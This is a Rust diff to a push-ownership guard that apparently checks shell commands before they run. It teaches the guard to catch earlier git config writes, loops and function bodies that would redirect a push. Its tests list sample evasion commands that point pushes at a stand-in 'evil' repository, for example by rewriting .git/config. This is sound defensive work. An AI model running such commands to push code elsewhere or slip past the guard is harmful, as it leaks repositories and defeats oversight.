@@ -149,6 +149,14 @@ pub struct PushInvocation {
     /// environment, or a URL value carrying `$` or a backtick. An ownership
     /// guard must refuse it (cadence-hooks#1131).
     pub destination_unreadable: bool,
+    /// Remotes a `-c remote.pushDefault=…`/`branch.<b>.pushRemote=…`/
+    /// `branch.<b>.remote=…` global, or an earlier segment writing one of those
+    /// keys, points this push at, as written: a remote name or a URL. Real git
+    /// sends a bare push to that remote, while the guard's probe reads the
+    /// configured one, so an ownership guard must judge each of these too —
+    /// every one, even for a push that names its remote, which is stricter
+    /// than git (cadence-hooks#1156).
+    pub config_remotes: Vec<String>,
     /// The repository argument as written — git's first positional, else a
     /// `--repo` value ([`crate::shell::push_repository_argument`]). `None` for
     /// a bare `git push`, where git uses the tracking remote. A remote name or
@@ -169,7 +177,17 @@ pub struct PushInvocation {
 pub fn push_invocations(command: &str, cwd: &str) -> Vec<PushInvocation> {
     let mut out = Vec::new();
     let walk = Walk::for_command(command, true);
-    collect_push_invocations(command, cwd, 0, Doubt::default(), walk, &mut out);
+    let mut writes = Vec::new();
+    collect_push_invocations(
+        command,
+        cwd,
+        0,
+        Doubt::default(),
+        walk,
+        &mut writes,
+        &mut out,
+    );
+    apply_config_writes_everywhere(command, &writes, &mut out);
     out
 }
 
@@ -183,8 +201,64 @@ pub fn push_invocations(command: &str, cwd: &str) -> Vec<PushInvocation> {
 pub fn push_locations(command: &str, cwd: &str) -> Vec<PushInvocation> {
     let mut out = Vec::new();
     let walk = Walk::for_command(command, false);
-    collect_push_invocations(command, cwd, 0, Doubt::default(), walk, &mut out);
+    let mut writes = Vec::new();
+    collect_push_invocations(
+        command,
+        cwd,
+        0,
+        Doubt::default(),
+        walk,
+        &mut writes,
+        &mut out,
+    );
+    apply_config_writes_everywhere(command, &writes, &mut out);
     out
+}
+
+/// Hand every config write in the command to every push in it, when the
+/// command can run a push AFTER a write that follows it in the text.
+///
+/// The walk hands a push only the writes that precede it, which is the order
+/// a straight-line command runs in — so `git push -u origin main && git
+/// remote add upstream <other-owner-url>` stays allowed. A loop body, a
+/// function defined before its call, and a `trap` action break that order:
+/// `for i in 1 2; do git push origin main; git remote set-url origin <evil>;
+/// done` pushes to `<evil>` the second time round. The trigger is a plain
+/// text match, so a mention in a message only makes the judgment stricter
+/// (cadence-hooks#1156).
+fn apply_config_writes_everywhere(
+    command: &str,
+    writes: &[ConfigRedirect],
+    out: &mut [PushInvocation],
+) {
+    static REORDERS: std::sync::LazyLock<regex::Regex> = std::sync::LazyLock::new(|| {
+        regex::Regex::new(r"\b(?:for|while|until|select|function|trap)\b|\(\s*\)")
+            .expect("pattern should compile")
+    });
+    if writes.is_empty() || !REORDERS.is_match(command) {
+        return;
+    }
+    for push in out {
+        apply_config_writes(writes, push);
+    }
+}
+
+/// More config writes than this in one command are refused rather than
+/// copied onto every push: the count is the command's to choose, and a
+/// 200 KB `git remote add …; git push …` flood would otherwise copy every
+/// write onto every push.
+const MAX_CONFIG_WRITES: usize = 16;
+
+/// Record `writes` on `push`, or mark it unreadable past
+/// [`MAX_CONFIG_WRITES`].
+fn apply_config_writes(writes: &[ConfigRedirect], push: &mut PushInvocation) {
+    if writes.len() > MAX_CONFIG_WRITES {
+        push.destination_unreadable = true;
+        return;
+    }
+    for write in writes {
+        write.apply_to(push);
+    }
 }
 
 /// What a scope cannot vouch for, carried into the scripts it spawns.
@@ -275,6 +349,7 @@ fn collect_push_invocations(
     depth: usize,
     inherited: Doubt,
     walk: Walk,
+    writes: &mut Vec<ConfigRedirect>,
     out: &mut Vec<PushInvocation>,
 ) {
     let mut effective_dir = cwd.to_string();
@@ -288,7 +363,12 @@ fn collect_push_invocations(
 
     for (segment, _next_op) in split_segments_with_ops(script) {
         let trimmed = segment.trim();
-        let segment = strip_group_wrappers(&segment);
+        // A function definition glued to its body (`f(){ git push …`) left
+        // `f(){` in command position, so the push inside it was never seen
+        // while the call later ran it (cadence-hooks#1156). The body is read
+        // where it is written, as a spaced `f() { …` already was.
+        let segment = strip_function_head(&segment);
+        let segment = strip_group_wrappers(segment);
         // **An unbalanced closer means the trim ate part of a real word.**
         // `strip_group_wrappers` removes a trailing `)`/`}` unconditionally,
         // without checking that an opener matched — so a segment whose last
@@ -418,7 +498,15 @@ fn collect_push_invocations(
                 directory: segment_directory,
             };
             for child in child_scripts(argv, segment) {
-                collect_push_invocations(&child, &segment_dir, depth + 1, child_doubt, walk, out);
+                collect_push_invocations(
+                    &child,
+                    &segment_dir,
+                    depth + 1,
+                    child_doubt,
+                    walk,
+                    writes,
+                    out,
+                );
             }
         }
 
@@ -454,8 +542,22 @@ fn collect_push_invocations(
             None => {}
         }
 
+        // A write to the repository's remote config lands on disk, so it
+        // reaches every later push in the command, in this scope or any other
+        // — a subshell's `git remote set-url` outlives the subshell
+        // (cadence-hooks#1156).
+        writes.extend(config_writes_of(
+            argv,
+            argv_quoted,
+            &tokens,
+            &unquoted_prefix_lens,
+            &segment_dir,
+            known_ok,
+        ));
+
         if let Some(mut invocation) = push_invocation_of(argv, argv_quoted, &segment_dir, known_ok)
         {
+            apply_config_writes(writes, &mut invocation);
             invocation.unresolved |= segment_unresolved || segment_directory;
             invocation.repository_unresolved |= segment_unresolved;
             invocation.directory_unverified |= segment_directory;
@@ -478,9 +580,29 @@ fn collect_push_invocations(
                 directory_unverified: segment_directory,
                 config_destinations: Vec::new(),
                 destination_unreadable: false,
+                config_remotes: Vec::new(),
                 repository: None,
             });
         }
+    }
+}
+
+/// `segment` without a leading function-definition head — `f()`, `f ( )`,
+/// `function f`, `function f()` — so its body reads as the command it is.
+fn strip_function_head(segment: &str) -> &str {
+    static HEAD: std::sync::LazyLock<regex::Regex> = std::sync::LazyLock::new(|| {
+        regex::Regex::new(
+            r"^\s*(?:function\s+[^\s(){}]+\s*(?:\(\s*\))?|[^\s(){}=$`'\x22]+\s*\(\s*\))\s*(?:[{(]|$)",
+        )
+        .expect("pattern should compile")
+    });
+    match HEAD.find(segment) {
+        Some(head) => {
+            // Keep the group opener: `strip_group_wrappers` removes it.
+            let opener = segment[..head.end()].ends_with(['{', '(']);
+            &segment[head.end() - usize::from(opener)..]
+        }
+        None => segment,
     }
 }
 
@@ -1362,6 +1484,8 @@ struct GitGlobals<'a> {
     config_destinations: Vec<String>,
     /// See [`PushInvocation::destination_unreadable`].
     destination_unreadable: bool,
+    /// See [`PushInvocation::config_remotes`].
+    config_remotes: Vec<String>,
     /// The words from git's subcommand onward.
     rest: &'a [String],
 }
@@ -1395,10 +1519,12 @@ fn git_globals<'a>(argv: &'a [String], effective_dir: &str, known_ok: bool) -> G
     let mut push_config_override = false;
     let mut config_destinations = Vec::new();
     let mut destination_unreadable = false;
+    let mut config_remotes = Vec::new();
     let mut note_redirect =
         |setting: &str, from_env: bool| match config_push_redirect(setting, from_env) {
             ConfigRedirect::None => {}
             ConfigRedirect::Url(url) => config_destinations.push(url),
+            ConfigRedirect::Remote(remote) => config_remotes.push(remote),
             ConfigRedirect::Unreadable => destination_unreadable = true,
         };
     let mut idx = 0;
@@ -1480,19 +1606,45 @@ fn git_globals<'a>(argv: &'a [String], effective_dir: &str, known_ok: bool) -> G
         push_config_override,
         config_destinations,
         destination_unreadable,
+        config_remotes,
         rest: &argv[idx..],
     }
 }
 
-/// What one `-c`/`--config-env` setting does to where a push goes.
+/// What one `-c`/`--config-env` setting, or one earlier config write, does to
+/// where a push goes.
+#[derive(Debug, Clone)]
 enum ConfigRedirect {
     /// Nothing: the key does not decide the destination.
     None,
     /// `remote.<name>.url`/`.pushurl` with a literal value: the push may go
     /// there.
     Url(String),
+    /// `remote.pushDefault`/`branch.<b>.pushRemote`/`branch.<b>.remote` with
+    /// a literal value: a bare push may go to that remote.
+    Remote(String),
     /// The key decides the destination, but the text cannot show where.
     Unreadable,
+}
+
+impl ConfigRedirect {
+    /// Record this redirect on a push that runs after it.
+    fn apply_to(&self, push: &mut PushInvocation) {
+        match self {
+            Self::None => {}
+            Self::Url(url) => {
+                if !push.config_destinations.contains(url) {
+                    push.config_destinations.push(url.clone());
+                }
+            }
+            Self::Remote(remote) => {
+                if !push.config_remotes.contains(remote) {
+                    push.config_remotes.push(remote.clone());
+                }
+            }
+            Self::Unreadable => push.destination_unreadable = true,
+        }
+    }
 }
 
 /// Does this `-c`/`--config-env` setting redirect a push (cadence-hooks#1131)?
@@ -1527,14 +1679,277 @@ fn config_push_redirect(setting: &str, from_env: bool) -> ConfigRedirect {
     {
         return ConfigRedirect::Unreadable;
     }
+    let readable = value.filter(|v| !from_env && !v.is_empty() && !v.contains(['$', '`']));
+    // Keys that pick WHICH remote a bare push uses (cadence-hooks#1156).
+    if key == "remote.pushdefault" || names("branch.", &[".pushremote", ".remote"]) {
+        return readable.map_or(ConfigRedirect::Unreadable, |remote| {
+            ConfigRedirect::Remote(remote.to_string())
+        });
+    }
     if !names("remote.", &[".url", ".pushurl"]) {
         return ConfigRedirect::None;
     }
-    match value {
-        Some(url) if !from_env && !url.is_empty() && !url.contains(['$', '`']) => {
-            ConfigRedirect::Url(url.to_string())
+    readable.map_or(ConfigRedirect::Unreadable, |url| {
+        ConfigRedirect::Url(url.to_string())
+    })
+}
+
+/// Commands that only read a file named on their command line. Any other verb
+/// naming a git config file is taken to write it (cadence-hooks#1156).
+const READS_ONLY: &[&str] = &[
+    "cat",
+    "less",
+    "more",
+    "head",
+    "tail",
+    "grep",
+    "egrep",
+    "fgrep",
+    "rg",
+    "ag",
+    "bat",
+    "wc",
+    "ls",
+    "stat",
+    "file",
+    "diff",
+    "cmp",
+    "echo",
+    "printf",
+    "test",
+    "[",
+    "realpath",
+    "readlink",
+    "md5sum",
+    "sha1sum",
+    "sha256sum",
+    "shasum",
+];
+
+/// The config writes one segment makes that can change where a LATER push
+/// goes (cadence-hooks#1156). The guard probes the repository before the
+/// command runs, so `git remote set-url origin <evil> && git push origin main`
+/// was judged against the old `origin`.
+///
+/// - `git remote add <name> <url>` and `git remote set-url <name> <url>`: the
+///   URL, judged like a `-c remote.<name>.url=` one; `set-url --delete` and
+///   `rename` are unreadable, since what is left depends on the config.
+/// - `git config` setting a key [`config_push_redirect`] reads: its value.
+///   Unsetting one, renaming or removing a `remote`/`url`/`branch`/`include`
+///   section, or `--edit` is unreadable. Reads (`--get`, `--list`, a lone key)
+///   write nothing. Every scope counts — `--global`, `--system` and `--file`
+///   can reach the repository as easily as `--local`.
+/// - a write redirect into a git config file, or any verb outside
+///   [`READS_ONLY`] naming one: unreadable.
+fn config_writes_of(
+    argv: &[String],
+    argv_quoted: &[usize],
+    tokens: &[String],
+    unquoted_prefix_lens: &[usize],
+    dir: &str,
+    known_ok: bool,
+) -> Vec<ConfigRedirect> {
+    let mut writes = Vec::new();
+    let mut idx = 0;
+    while let Some(word) = tokens.get(idx) {
+        let quoted = unquoted_prefix_lens.get(idx).copied().unwrap_or(0);
+        if let Some((len, whole)) = crate::shell::redirect_operator_span(word)
+            && quoted >= len
+        {
+            let target = if whole {
+                tokens.get(idx + 1).map(String::as_str)
+            } else {
+                Some(&word[len..])
+            };
+            if word[..len].contains('>') && target.is_some_and(|t| names_git_config_file(t, dir)) {
+                writes.push(ConfigRedirect::Unreadable);
+            }
+            idx += if whole { 2 } else { 1 };
+            continue;
         }
-        _ => ConfigRedirect::Unreadable,
+        idx += 1;
+    }
+
+    let operands = strip_unquoted_redirections(argv, argv_quoted);
+    let Some((verb, words)) = operands.split_first() else {
+        return writes;
+    };
+    let verb = command_word(verb);
+    if verb != "git" {
+        if !READS_ONLY.contains(&verb.as_ref())
+            && words.iter().any(|word| names_git_config_file(word, dir))
+        {
+            writes.push(ConfigRedirect::Unreadable);
+        }
+        return writes;
+    }
+    let words: Vec<String> = words.iter().map(|word| (*word).clone()).collect();
+    let globals = git_globals(&words, dir, known_ok);
+    let Some((subcommand, rest)) = globals.rest.split_first() else {
+        return writes;
+    };
+    let rest: Vec<String> = rest
+        .iter()
+        .map(|word| unescape_word(word).into_owned())
+        .collect();
+    match unescape_word(subcommand).as_ref() {
+        "remote" => writes.extend(git_remote_writes(&rest)),
+        "config" => writes.extend(git_config_writes(&rest)),
+        _ => {}
+    }
+    writes
+}
+
+/// Does `word` name a git config file — a repository's `config` (bare or
+/// not, and a linked worktree's `config.worktree`), `~/.gitconfig`,
+/// `/etc/gitconfig`, or `$XDG_CONFIG_HOME/git/config`? A path the shell
+/// builds (`$GIT_DIR/config`) counts when its text ends in `config`.
+fn names_git_config_file(word: &str, dir: &str) -> bool {
+    let word = unescape_word(word);
+    let word = word.trim_end_matches('/');
+    if !word.to_ascii_lowercase().contains("config") {
+        return false;
+    }
+    if word.contains(['$', '`']) {
+        return true;
+    }
+    let path = resolve_cd_target(word, dir).to_ascii_lowercase();
+    path.ends_with("gitconfig")
+        || path.ends_with("config.worktree")
+        || (path.ends_with("/config") && (path.contains(".git/") || path.ends_with("/git/config")))
+}
+
+/// A literal URL value, or unreadable.
+fn written_url(value: Option<&String>) -> Option<ConfigRedirect> {
+    let value = value?;
+    Some(if value.is_empty() || value.contains(['$', '`']) {
+        ConfigRedirect::Unreadable
+    } else {
+        ConfigRedirect::Url(value.clone())
+    })
+}
+
+/// The writes a `git remote …` makes; `words` are the unescaped words after
+/// `remote`.
+fn git_remote_writes(words: &[String]) -> Option<ConfigRedirect> {
+    let mut words = words
+        .iter()
+        .skip_while(|word| matches!(word.as_str(), "-v" | "--verbose"));
+    let subcommand = words.next()?;
+    let args: Vec<&String> = words.collect();
+    let positionals = |value_options: &[&str]| {
+        let mut out = Vec::new();
+        let mut idx = 0;
+        while let Some(word) = args.get(idx) {
+            if value_options.contains(&word.as_str()) {
+                idx += 2;
+                continue;
+            }
+            if !word.starts_with('-') {
+                out.push(*word);
+            }
+            idx += 1;
+        }
+        out
+    };
+    match subcommand.as_str() {
+        "add" => written_url(
+            positionals(&["-t", "--track", "-m", "--master"])
+                .get(1)
+                .copied(),
+        ),
+        "set-url" if args.iter().any(|word| *word == "--delete") => {
+            Some(ConfigRedirect::Unreadable)
+        }
+        "set-url" => written_url(positionals(&[]).get(1).copied()),
+        "rename" => Some(ConfigRedirect::Unreadable),
+        _ => None,
+    }
+}
+
+/// Could this `git config` key or section name decide where a push goes?
+fn names_push_config_section(word: &str) -> bool {
+    let word = word.to_ascii_lowercase();
+    ["remote", "url", "branch", "include"]
+        .iter()
+        .any(|section| word.starts_with(section))
+}
+
+/// The writes a `git config …` makes; `words` are the unescaped words after
+/// `config`. Both grammars: the option form (`--unset`, `--get`) and the
+/// subcommand form (`set`, `unset`, `get`) of git 2.46.
+fn git_config_writes(words: &[String]) -> Option<ConfigRedirect> {
+    const VALUE_OPTIONS: &[&str] = &[
+        "-f",
+        "--file",
+        "--blob",
+        "--type",
+        "--default",
+        "--comment",
+        "--value",
+    ];
+    let mut positionals: Vec<&String> = Vec::new();
+    let (mut reads, mut removes, mut edits) = (false, false, false);
+    let mut options_ended = false;
+    let mut idx = 0;
+    while let Some(word) = words.get(idx) {
+        if !options_ended && word == "--" {
+            options_ended = true;
+        } else if !options_ended && word.starts_with('-') && word.len() > 1 {
+            match word.as_str() {
+                "--get" | "--get-all" | "--get-regexp" | "--get-urlmatch" | "--get-color"
+                | "--get-colorbool" | "-l" | "--list" => reads = true,
+                "--unset" | "--unset-all" | "--rename-section" | "--remove-section" => {
+                    removes = true;
+                }
+                "-e" | "--edit" => edits = true,
+                _ => {}
+            }
+            if VALUE_OPTIONS.contains(&word.as_str()) {
+                idx += 1;
+            }
+        } else {
+            positionals.push(word);
+        }
+        idx += 1;
+    }
+    match positionals.first().map(|word| word.as_str()) {
+        Some("list" | "get") => reads = true,
+        Some("edit") => edits = true,
+        Some("unset" | "rename-section" | "remove-section") => {
+            removes = true;
+            positionals.remove(0);
+        }
+        Some("set") => {
+            positionals.remove(0);
+        }
+        _ => {}
+    }
+    if edits {
+        return Some(ConfigRedirect::Unreadable);
+    }
+    if reads {
+        return None;
+    }
+    let touches_push_config = positionals
+        .iter()
+        .any(|word| names_push_config_section(word));
+    if removes {
+        return touches_push_config.then_some(ConfigRedirect::Unreadable);
+    }
+    let (Some(key), Some(value)) = (positionals.first(), positionals.get(1)) else {
+        // A lone key is a read.
+        return None;
+    };
+    match config_push_redirect(&format!("{key}={value}"), false) {
+        // A key this reading does not recognise, next to one it does: an
+        // option it does not model has shifted the words, so the write
+        // cannot be read.
+        ConfigRedirect::None if touches_push_config && !names_push_config_section(key) => {
+            Some(ConfigRedirect::Unreadable)
+        }
+        ConfigRedirect::None => None,
+        redirect => Some(redirect),
     }
 }
 
@@ -1654,6 +2069,7 @@ fn push_invocation_of(
         directory_unverified: globals.unreadable_dir,
         config_destinations: globals.config_destinations,
         destination_unreadable: globals.destination_unreadable,
+        config_remotes: globals.config_remotes,
         repository: {
             let named = crate::shell::push_repository_argument(words);
             named.positional.or(named.repo_flag)
@@ -3640,5 +4056,175 @@ mod tests {
             git_output_detailed(&dir, &["rev-list", "no-such-ref", "--"]),
             GitOutput::Failed
         );
+    }
+
+    /// cadence-hooks#1156: `(command, config_destinations, config_remotes,
+    /// destination_unreadable)` for the command's LAST push.
+    #[test]
+    fn an_earlier_config_write_is_reported_on_a_later_push() {
+        let evil = "https://github.com/evil/y";
+        for (command, urls, remotes, unreadable) in [
+            (
+                "git remote set-url --push origin https://github.com/evil/y && git push origin main",
+                vec![evil],
+                vec![],
+                false,
+            ),
+            (
+                "git remote add -t main x https://github.com/evil/y; git push x main",
+                vec![evil],
+                vec![],
+                false,
+            ),
+            (
+                "git config --local --add remote.origin.pushurl https://github.com/evil/y; git push",
+                vec![evil],
+                vec![],
+                false,
+            ),
+            (
+                "git config remote.pushDefault evilr && git push",
+                vec![],
+                vec!["evilr"],
+                false,
+            ),
+            (
+                "git config branch.main.pushRemote evilr && git push",
+                vec![],
+                vec!["evilr"],
+                false,
+            ),
+            (
+                "git -c branch.main.remote=evilr push",
+                vec![],
+                vec!["evilr"],
+                false,
+            ),
+            (
+                "git config --file x.cfg --unset branch.main.remote && git push",
+                vec![],
+                vec![],
+                true,
+            ),
+            (
+                "git config rename-section remote.a remote.origin && git push",
+                vec![],
+                vec![],
+                true,
+            ),
+            (
+                "git config include.path /x.cfg && git push",
+                vec![],
+                vec![],
+                true,
+            ),
+            (
+                "git config --weird v remote.origin.url https://github.com/evil/y && git push",
+                vec![],
+                vec![],
+                true,
+            ),
+            (
+                "git remote rename a origin && git push origin main",
+                vec![],
+                vec![],
+                true,
+            ),
+            (
+                "git remote add x \"$U\" && git push x main",
+                vec![],
+                vec![],
+                true,
+            ),
+            ("cp evil.cfg .git/config && git push", vec![], vec![], true),
+            ("printf x >~/.gitconfig && git push", vec![], vec![], true),
+            (
+                "echo x > \"$GIT_DIR/config\" && git push",
+                vec![],
+                vec![],
+                true,
+            ),
+            (
+                "while true; do git push origin main; git config remote.pushDefault evilr; done",
+                vec![],
+                vec!["evilr"],
+                false,
+            ),
+            // Controls: reads, unrelated keys and files, and a write after
+            // the push in straight-line order.
+            (
+                "git remote -v && git remote show origin && git push",
+                vec![],
+                vec![],
+                false,
+            ),
+            (
+                "git config get remote.origin.url && git config -l && git push",
+                vec![],
+                vec![],
+                false,
+            ),
+            (
+                "git config user.name x && git config --unset user.email && git push",
+                vec![],
+                vec![],
+                false,
+            ),
+            (
+                "cat .git/config && grep url .git/config && git push",
+                vec![],
+                vec![],
+                false,
+            ),
+            (
+                "echo x > config.json && cp a b && git push",
+                vec![],
+                vec![],
+                false,
+            ),
+            (
+                "git push; git remote add upstream https://github.com/evil/y",
+                vec![],
+                vec![],
+                false,
+            ),
+        ] {
+            let pushes = push_locations(command, "/r");
+            let push = pushes
+                .last()
+                .unwrap_or_else(|| panic!("no push in {command}"));
+            let urls: Vec<String> = urls.into_iter().map(String::from).collect();
+            let remotes: Vec<String> = remotes.into_iter().map(String::from).collect();
+            assert_eq!(push.config_destinations, urls, "{command}");
+            assert_eq!(push.config_remotes, remotes, "{command}");
+            assert_eq!(push.destination_unreadable, unreadable, "{command}");
+        }
+    }
+
+    /// A function body glued to its head (`f(){ …`) is walked like the spaced
+    /// spelling (cadence-hooks#1156).
+    #[test]
+    fn a_function_body_is_walked_whatever_its_spacing() {
+        for command in [
+            "f(){ git -C /other push origin main; }; f",
+            "f() { git -C /other push origin main; }; f",
+            "function f { git -C /other push origin main; }; f",
+            "function f(){ git -C /other push origin main; }; f",
+            "f()(git -C /other push origin main); f",
+        ] {
+            let dirs: Vec<String> = push_locations(command, "/r")
+                .into_iter()
+                .map(|push| push.work_dir)
+                .collect();
+            assert_eq!(dirs, ["/other"], "{command}");
+        }
+        // Not a function head.
+        for command in ["echo f(x) && git push", "x=(a) && git push"] {
+            let dirs: Vec<String> = push_locations(command, "/r")
+                .into_iter()
+                .map(|push| push.work_dir)
+                .collect();
+            assert_eq!(dirs, ["/r"], "{command}");
+        }
     }
 }
